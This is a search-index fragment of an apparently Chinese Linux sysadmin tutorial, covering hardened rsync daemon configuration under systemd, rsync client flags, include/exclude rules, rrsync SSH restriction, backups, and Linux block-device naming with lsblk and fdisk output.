\u200b\u5305\u542b\u200b\u6a21\u5757\u200b\u5b9a\u4e49\u200b\n&amp;include /etc/rsyncd/common.conf\n</code></pre> <p>\u200b\u4f7f\u7528\u200b systemd \u200b\u5b89\u5168\u200b\u52a0\u56fa\u200b rsync \u200b\u670d\u52a1\u200b</p> <p>Systemd \u200b\u670d\u52a1\u200b\u7684\u200b\u5b89\u5168\u200b\u52a0\u56fa\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u907f\u514d\u200b\u672a\u77e5\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u5f71\u54cd\u200b rsync \u200b\u670d\u52a1\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b rsync \u200b\u4e8e\u200b 2025 \u200b\u5e74\u200b 1 \u200b\u6708\u200b\u66b4\u9732\u200b\u4e86\u200b\u591a\u4e2a\u200b CVE \u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff08\u200b\u5176\u4e2d\u200b\u4e24\u4e2a\u200b\u662f\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff09\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u52a0\u56fa\u200b\u5c31\u200b\u663e\u5f97\u200b\u66f4\u52a0\u200b\u91cd\u8981\u200b\u3002</p> <p>\u200b\u4e00\u4efd\u200b\u53c2\u8003\u200b <code>rsync@.service</code> \u200b\u5982\u4e0b\u200b\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u5b89\u5168\u200b\u52a0\u56fa\u200b\u4ee5\u53ca\u200b\u964d\u4f4e\u200b IO \u200b\u4e0e\u200b CPU \u200b\u4f18\u5148\u7ea7\u200b\u7684\u200b\u8bbe\u7f6e\u200b\uff08\u200b\u8fd9\u200b\u540c\u6837\u200b\u4e5f\u200b\u662f\u200b\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b\u76ee\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\uff09\uff1a</p> <pre><code>[Unit]\nDescription=fast remote file copy program daemon\nConditionPathExists=/etc/rsyncd/rsyncd-%i.conf\nAfter=network.target network-online.target\n\n[Service]\nType=exec\nPIDFile=rsyncd-%i.pid\nExecStart=/usr/bin/rsync --daemon --no-detach --config=/etc/rsyncd/rsyncd-%i.conf\n\nNice=19\nIOSchedulingClass=best-effort\nIOSchedulingPriority=7\nIOAccounting=true\n\nProtectSystem=strict\nProtectHome=true\nProtectProc=invisible\nProtectControlGroups=true\nProtectKernelModules=true\nProtectKernelTunables=true\nPrivateTmp=true\nPrivateDevices=true\nNoNewPrivileges=true\nMemoryDenyWriteExecute=true\n\nReadWritePaths=/var/log/rsyncd\n\n[Install]\nWantedBy=multi-user.target\nAlias=rsyncd@.service\n</code></pre> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u5c06\u200b <code>uid</code> \u200b\u4e0e\u200b <code>gid</code> \u200b\u4fee\u6539\u200b\u4e3a\u200b\u5728\u200b systemd \u200b\u670d\u52a1\u200b\u4e2d\u200b\u914d\u7f6e\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u8ba9\u200b daemon \u200b\u81ea\u5df1\u200b\u964d\u6743\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b <code>chroot</code> \u200b\u7b49\u200b\u5fc5\u8981\u200b\u7684\u200b capability\u3002</p> <p>Rsync \u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b</p> <p>ustclug/rsync-proxy \u200b\u9879\u76ee\u200b\u652f\u6301\u200b\u57fa\u4e8e\u200b\u6a21\u5757\u200b\u540d\u200b\u7684\u200b rsync \u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u4e0d\u540c\u200b\u7684\u200b\u6a21\u5757\u200b\u653e\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\uff0c\u200b\u7531\u200b rsync-proxy \u200b\u4ee3\u7406\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u3002</p>"},{"location":"ops/storage/backup/#rsync-client","title":"Rsync \u200b\u5ba2\u6237\u7aef\u200b\u53c2\u6570","text":"<p>\u200b\u4e00\u4efd\u200b\u53c2\u8003\u200b\u7684\u200b\u5b8c\u6574\u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff08\u200b\u4fee\u6539\u200b\u81ea\u200b ustcmirror-images \u200b\u7684\u200b rsync \u200b\u540c\u6b65\u200b\u811a\u672c\u200b\uff09\uff1a</p> <pre><code>rsync -pPrltvH --partial-dir=.rsync-partial --timeout 14400 --safe-links --delete-excluded --delete-delay --delay-updates --sparse --max-delete 4000 rsync://server/repo1/ /path/to/destination\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u90e8\u5206\u200b\u53c2\u6570\u200b\u542b\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> \u200b\u53c2\u6570\u200b \u200b\u8bf4\u660e\u200b <code>-H</code> \u200b\u4fdd\u7559\u200b\u786c\u200b\u94fe\u63a5\u200b <code>--partial-dir</code> \u200b\u4fdd\u8bc1\u200b\u90e8\u5206\u200b\u4f20\u8f93\u200b\u7684\u200b\u6587\u4ef6\u200b\u5747\u200b\u5728\u200b\u8be5\u200b\u76ee\u5f55\u200b\u4e2d\u200b <code>--timeout</code> \u200b\u8d85\u65f6\u200b\u65f6\u95f4\u200b <code>--safe-links</code> \u200b\u5ffd\u7565\u200b\u6307\u5411\u200b\u5bf9\u5e94\u200b\u4ed3\u5e93\u200b\u5916\u90e8\u200b\u7684\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\uff0c\u200b\u907f\u514d\u200b\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\u5bfc\u81f4\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\u975e\u200b\u9884\u671f\u200b\u66b4\u9732\u200b <code>--delete-excluded</code> \u200b\u5220\u9664\u200b\u88ab\u200b\u6392\u9664\u200b\uff08exclude\uff09\u200b\u7684\u200b\u6587\u4ef6\u200b <code>--delete-delay</code> \u200b\u5728\u200b\u540c\u6b65\u200b\u5b8c\u6210\u200b\u540e\u200b\u518d\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\uff0c\u200b\u907f\u514d\u200b\u5728\u200b\u540c\u6b65\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\u5bfc\u81f4\u200b\u4ed3\u5e93\u200b\u4e0d\u53ef\u200b\u7528\u200b <code>--delay-updates</code> \u200b\u5728\u200b\u540c\u6b65\u200b\u5b8c\u6210\u200b\u540e\u200b\u518d\u200b\u66f4\u65b0\u200b\u6587\u4ef6\u200b\uff0c\u200b\u907f\u514d\u200b\u5728\u200b\u540c\u6b65\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u66f4\u65b0\u200b\u6587\u4ef6\u200b\u5bfc\u81f4\u200b\u4ed3\u5e93\u200b\u4e0d\u53ef\u200b\u7528\u200b <code>--sparse</code> \u200b\u4fdd\u7559\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b\u7684\u200b\u7a00\u758f\u200b\u6027\u200b <code>--max-delete</code> \u200b\u9650\u5236\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u907f\u514d\u200b\u8bef\u64cd\u4f5c\u200b\u5bfc\u81f4\u200b\u5927\u91cf\u6587\u4ef6\u200b\u88ab\u200b\u5220\u9664"},{"location":"ops/storage/backup/#rsync-include-exclude","title":"\u5305\u542b\u200b\u4e0e\u200b\u6392\u9664","text":"<p>Rsync \u200b\u652f\u6301\u200b <code>--include</code> \u200b\u4e0e\u200b <code>--exclude</code> \u200b\u53c2\u6570\u200b\u3002\u200b\u7b80\u5355\u200b\u6765\u8bb2\u200b\uff0crsync \u200b\u7684\u200b\u5904\u7406\u200b\u89c4\u5219\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u200b/\u200b\u6587\u4ef6\u5939\u200b\u4f1a\u200b\u6309\u7167\u200b\u7528\u6237\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u4e2d\u200b\u63d0\u4f9b\u200b\u7684\u200b\u987a\u5e8f\u200b\u5339\u914d\u200b\uff0c\u200b\u5982\u679c\u200b\u547d\u4e2d\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u88ab\u200b\u5904\u7406\u200b\uff0c\u200b\u540e\u7eed\u200b\u7684\u200b\u89c4\u5219\u200b\u5bf9\u200b\u8be5\u200b\u6587\u4ef6\u200b\u4e0d\u518d\u200b\u751f\u6548\u200b\u3002\u200b\u5177\u4f53\u200b\u5339\u914d\u200b\u7684\u200b\u89c4\u5219\u200b\u53ef\u200b\u53c2\u8003\u200b rsync.1 \u200b\u624b\u518c\u200b\u7684\u200b \"PATTERN MATCHING RULES\" \u200b\u90e8\u5206\u200b\u3002</li> <li>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u547d\u4e2d\u200b\u4efb\u4f55\u200b\u89c4\u5219\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f1a\u200b\u88ab\u200b\u5305\u542b\u200b\u3002</li> <li>\u200b\u547d\u4e2d\u200b <code>--exclude</code> \u200b\u4ee3\u8868\u200b\u5176\u5b50\u200b\u6587\u4ef6\u200b\u548c\u200b\u6587\u4ef6\u5939\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u6392\u9664\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u8981\u200b\u5305\u542b\u200b <code>a/b/c/d</code>\uff0c\u200b\u90a3\u4e48\u200b <code>a/</code>, <code>a/b/</code>, <code>a/b/c/</code> \u200b\u90fd\u200b\u9700\u8981\u200b\u88ab\u200b\u5305\u542b\u200b\u3002</li> </ol> <p>\u200b\u5339\u914d\u200b\u7ec3\u4e60\u200b</p> <p>\u200b\u8bf7\u200b\u5c1d\u8bd5\u200b\u5206\u522b\u200b\u5199\u51fa\u200b\u7b26\u5408\u200b\u4ee5\u4e0b\u200b\u6761\u4ef6\u200b\u7684\u200b rsync \u200b\u53c2\u6570\u200b\uff0c\u200b\u5047\u8bbe\u200b\u9700\u8981\u200b\u4ece\u200b src \u200b\u540c\u6b65\u200b\u5230\u200b dst\uff1a</p> <ol> <li>\u200b\u6392\u9664\u200b src \u200b\u4e0b\u200b\u7684\u200b <code>manjaro</code> \u200b\u76ee\u5f55\u200b\uff08\u200b\u4e0d\u8981\u200b\u6392\u9664\u200b\u5176\u4ed6\u200b\u540d\u79f0\u200b\u5305\u542b\u200b <code>manjaro</code> \u200b\u7684\u200b\u6587\u4ef6\u200b\u6216\u200b\u76ee\u5f55\u200b\uff09\u3002</li> <li>\u200b\u6392\u9664\u200b\u6240\u6709\u200b\u540d\u79f0\u200b\u4e3a\u200b <code>s390x</code> \u200b\u7684\u200b\u76ee\u5f55\u200b\u3002</li> <li>\u200b\u6392\u9664\u200b src \u200b\u4e0b\u200b\u7684\u200b <code>cloud</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u4fdd\u7559\u200b <code>cloud</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u6240\u6709\u200b <code>repodata.json</code> \u200b\u6587\u4ef6\u200b\u3002</li> </ol>"},{"location":"ops/storage/backup/#rsync-ssh","title":"SSH \u200b\u9650\u5236\u200b rsync \u200b\u8bbf\u95ee","text":"<p>rsync \u200b\u652f\u6301\u200b\u5229\u7528\u200b rrsync \u200b\u811a\u672c\u200b\u9650\u5236\u200b\u4f7f\u7528\u200b SSH \u200b\u8fde\u63a5\u200b\u7684\u200b\u7528\u6237\u200b\u53ea\u200b\u80fd\u591f\u200b\u4f7f\u7528\u200b rsync \u200b\u8bfb\u5199\u200b\u6307\u5b9a\u200b\u7684\u200b\u76ee\u5f55\u200b\uff0c\u200b\u786e\u4fdd\u200b\u7528\u6237\u200b\u4e0d\u4f1a\u200b\u901a\u8fc7\u200b SSH \u200b\u6267\u884c\u200b\u5176\u4ed6\u200b\u547d\u4ee4\u200b\uff0c\u200b\u6216\u8005\u200b\u8bbf\u95ee\u200b\u5230\u200b\u6307\u5b9a\u200b\u76ee\u5f55\u200b\u4ee5\u5916\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u8be6\u60c5\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u672c\u200b\u6559\u7a0b\u200b\u5173\u4e8e\u200b SSH \u200b\u7684\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"ops/storage/backup/#rsync-backup","title":"\u6587\u4ef6\u200b\u5907\u4efd","text":"<p>Rsync \u200b\u672c\u8eab\u200b\u4e0d\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b\u5907\u4efd\u200b\u5de5\u5177\u200b\uff0c\u200b\u5176\u200b\u6ca1\u6709\u200b\u7248\u672c\u200b\u7ba1\u7406\u200b\u529f\u80fd\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u200b\u88ab\u200b\u8bef\u5220\u9664\u200b/\u200b\u4fee\u6539\u200b\uff0c\u200b\u90a3\u4e48\u200b rsync \u200b\u4f1a\u200b\u5c06\u200b\u8fd9\u4e2a\u200b\u53d8\u5316\u200b\u540c\u6b65\u200b\u5230\u200b\u5907\u4efd\u200b\u4e2d\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u57fa\u4e8e\u200b rsync \u200b\u9ad8\u6548\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u6709\u200b\u5de5\u5177\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u57fa\u4e8e\u200b rsync \u200b\u548c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u786c\u200b\u94fe\u63a5\u200b\u529f\u80fd\u200b\u7684\u200b\u5907\u4efd\u200b\uff0c\u200b\u4f8b\u5982\u200b Linux Mint \u200b\u7684\u200b Timeshift \u200b\u9879\u76ee\u200b\u5c31\u200b\u901a\u8fc7\u200b\u786c\u200b\u94fe\u63a5\u200b\u5b9e\u73b0\u200b\u4e0d\u540c\u200b\u65f6\u95f4\u200b\u70b9\u200b\u5907\u4efd\u200b\u7684\u200b\u53bb\u200b\u91cd\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u800c\u200b rsync \u200b\u8d1f\u8d23\u200b\u6587\u4ef6\u200b\u7684\u200b\u590d\u5236\u200b\u3002</p>"},{"location":"ops/storage/filesystem/","title":"\u5206\u533a\u200b\u4e0e\u200b\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@iBug\u3001@stevapple\u3001@Integral-Tech</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p>"},{"location":"ops/storage/filesystem/#concepts","title":"\u76f8\u5173\u200b\u6982\u5ff5","text":"\u5757\u200b\u8bbe\u5907\u200b <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u78c1\u76d8\u200b\u8bbe\u5907\u200b\u7684\u200b\u8bfb\u5199\u200b\u5747\u200b\u4ee5\u5757\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u5b57\u8282\u200b\uff09\u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b Linux \u200b\u4e2d\u200b\uff0c\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u5206\u4e3a\u200b\u5757\u200b\u8bbe\u5907\u200b\u548c\u200b\u5b57\u7b26\u200b\u8bbe\u5907\u200b\u4e24\u79cd\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>lsblk</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u3002\u200b\u4e00\u4e2a\u200b\u684c\u9762\u200b\u7cfb\u7edf\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nnvme0n1     259:0    0  1.9T  0 disk \n\u251c\u2500nvme0n1p1 259:1    0  260M  0 part \n\u251c\u2500nvme0n1p2 259:2    0   56G  0 part [SWAP]\n\u2514\u2500nvme0n1p3 259:3    0  1.8T  0 part /var/lib/docker/btrfs\n                                     /var\n                                     /tmp\n                                     /opt\n                                     /home\n                                     /\n</code></pre> \u200b\u5206\u533a\u8868\u200b <p>\u200b\u4e00\u4e2a\u200b\u5757\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u800c\u200b\u5206\u533a\u8868\u200b\u5219\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u5206\u533a\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u5206\u533a\u8868\u200b\u6709\u200b MBR \u200b\u548c\u200b GPT \u200b\u4e24\u79cd\u200b\u683c\u5f0f\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>fdisk</code> \u200b\u67e5\u770b\u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u5206\u533a\u8868\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>$ sudo fdisk -l /dev/nvme0n1\nDisk /dev/nvme0n1: 1.86 TiB, 2048408248320 bytes, 4000797360 sectors\nDisk model: INTEL SSDPEKNU020TZ                     \nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: BAF03C52-854E-41AD-9C42-6DD5C0E9F156\n\nDevice             Start        End    Sectors  Size Type\n/dev/nvme0n1p1      2048     534527     532480  260M EFI System\n/dev/nvme0n1p2    534528  117975039  117440512   56G Linux swap\n/dev/nvme0n1p3 117975040 4000796671 3882821632  1.8T Linux filesystem\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8be5\u5757\u200b\u8bbe\u5907\u200b\u4f7f\u7528\u200b\u4e86\u200b GPT \u200b\u5206\u533a\u8868\u200b\uff0c\u200b\u6709\u200b\u4e09\u4e2a\u200b\u5206\u533a\u200b\u3002</p> \u200b\u6587\u4ef6\u7cfb\u7edf\u200b <p>\u200b\u6bcf\u4e2a\u200b\u5206\u533a\u200b\u9700\u8981\u200b\u88ab\u200b\u683c\u5f0f\u5316\u200b\u6210\u200b\u67d0\u79cd\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u540e\u200b\uff0c\u200b\u624d\u80fd\u200b\u5b58\u50a8\u200b\u6587\u4ef6\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#blk-dev-naming","title":"\u5757\u200b\u8bbe\u5907\u200b\u547d\u540d\u200b\u89c4\u5219","text":"<p>\u200b\u5757\u200b\u8bbe\u5907\u200b\u540d\u200b\u7684\u200b\u524d\u7f00\u200b\u6307\u5b9a\u200b\u4e86\u200b\u64cd\u4f5c\u200b\u5757\u200b\u8bbe\u5907\u200b\u65f6\u200b\u4f7f\u7528\u200b\u7684\u200b\u9a71\u52a8\u200b\u5b50\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#scsi","title":"SCSI","text":"<p>\u200b\u652f\u6301\u200b SCSI \u200b\u547d\u4ee4\u200b\uff08SCSI\u3001SAS\u3001UASP\uff09\u3001ATA\uff08PATA\u3001SATA\uff09\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u548c\u200b USB \u200b\u5927\u5bb9\u91cf\u200b\u5b58\u50a8\u8bbe\u5907\u200b\uff0c\u200b\u6bd4\u5982\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u3001SATA \u200b\u63a5\u53e3\u200b\u7684\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u548c\u200b U \u200b\u76d8\u200b\uff0c\u200b\u5747\u200b\u7531\u200b SCSI \u200b\u9a71\u52a8\u200b\u5b50\u7cfb\u7edf\u200b\u5904\u7406\u200b\u3002 \u200b\u8fd9\u4e9b\u200b\u8bbe\u5907\u200b\u7684\u200b\u547d\u540d\u200b\u4ee5\u200b <code>sd</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>a</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u5c0f\u5199\u5b57\u6bcd\u200b\uff0c<code>a</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c<code>b</code> \u200b\u8868\u793a\u200b\u7b2c\u4e8c\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li> <p><code>/dev/sda</code> - \u200b\u8bbe\u5907\u200b <code>a</code>\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</p> </li> <li> <p><code>/dev/sde</code> - \u200b\u8bbe\u5907\u200b <code>e</code>\uff0c\u200b\u7b2c\u4e94\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</p> </li> </ul>"},{"location":"ops/storage/filesystem/#nvme","title":"NVMe","text":"<p>\u200b\u4f7f\u7528\u200b NVMe \u200b\u534f\u8bae\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u6bd4\u5982\u200b NVMe \u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff0c\u200b\u540d\u79f0\u200b\u4ee5\u200b <code>nvme</code> \u200b\u5f00\u5934\u200b\u3002 \u200b\u4e4b\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>0</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u6570\u5b57\u200b\uff0c\u200b\u8868\u793a\u200b\u8bbe\u5907\u200b\u63a7\u5236\u5668\u200b\uff08Controller\uff09\u200b\u53f7\u200b\u3002 <code>nvme0</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b NVMe \u200b\u63a7\u5236\u5668\u200b\uff0c<code>nvme1</code> \u200b\u8868\u793a\u200b\u7b2c\u4e8c\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002 \u200b\u7136\u540e\u200b\u662f\u200b\u5b57\u6bcd\u200b <code>n</code> \u200b\u548c\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>1</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u6570\u5b57\u200b\uff0c\u200b\u8868\u793a\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff08Namespace\uff09\u3002 \u200b\u6bd4\u5982\u200b <code>nvme0n1</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c<code>nvme0n2</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\u7684\u200b\u7b2c\u4e8c\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>/dev/nvme0n1</code> - \u200b\u63a7\u5236\u5668\u200b <code>0</code> \u200b\u4e0a\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b <code>1</code>\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002</li> <li><code>/dev/nvme2n5</code> - \u200b\u63a7\u5236\u5668\u200b <code>2</code> \u200b\u4e0a\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b <code>5</code>\uff0c\u200b\u7b2c\u4e09\u4e2a\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\u7684\u200b\u7b2c\u4e94\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002</li> </ul> <p>\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff08Namespace\uff09</p> <p>\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u662f\u200b NVMe \u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u7528\u6237\u200b\u6570\u636e\u200b\u7684\u200b\u7ed3\u6784\u200b\u3002\u200b\u4e00\u4e2a\u200b NVMe \u200b\u63a7\u5236\u5668\u200b\u53ef\u4ee5\u200b\u5305\u542b\u200b\u591a\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002\u200b\u76ee\u524d\u200b\uff0c\u200b\u5927\u591a\u6570\u200b NVMe \u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u90fd\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u3001\u200b\u5b89\u5168\u200b\u7b49\u200b\u9886\u57df\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#mmc","title":"MMC","text":"<p>SD \u200b\u5361\u200b\u3001\u200b\u591a\u5a92\u4f53\u200b\u5b58\u50a8\u5361\u200b\uff08MMC \u200b\u5361\u200b\uff09\u200b\u548c\u200b eMMC \u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7531\u200b <code>mmc</code> \u200b\u9a71\u52a8\u200b\u5904\u7406\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u8bbe\u5907\u200b\u7684\u200b\u540d\u79f0\u200b\u4ee5\u200b <code>mmcblk</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>0</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u6570\u5b57\u200b\u8868\u793a\u200b\u8bbe\u5907\u200b\u53f7\u200b\u3002 \u200b\u6bd4\u5982\u200b <code>mmcblk0</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c<code>mmcblk1</code> \u200b\u8868\u793a\u200b\u7b2c\u4e8c\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>/dev/mmcblk0</code> - \u200b\u8bbe\u5907\u200b <code>0</code>\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</li> <li><code>/dev/mmcblk4</code> - \u200b\u8bbe\u5907\u200b <code>4</code>\uff0c\u200b\u7b2c\u4e94\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</li> </ul> <p>\u200b\u6ce8\u610f\u200b</p> <p>\u200b\u5982\u679c\u200b SD/MMC \u200b\u8bfb\u5361\u5668\u200b\u4f7f\u7528\u200b USB \u200b\u63a5\u53e3\u200b\uff0c\u200b\u5219\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u5c06\u200b\u7531\u200b SCSI \u200b\u9a71\u52a8\u200b\u5b50\u7cfb\u7edf\u200b\u5904\u7406\u200b\uff0c\u200b\u5e76\u200b\u9075\u5faa\u200b\u5176\u200b\u547d\u540d\u200b\u89c4\u5219\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#scsi-optical","title":"SCSI \u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668","text":"<p>\u200b\u901a\u8fc7\u200b SCSI 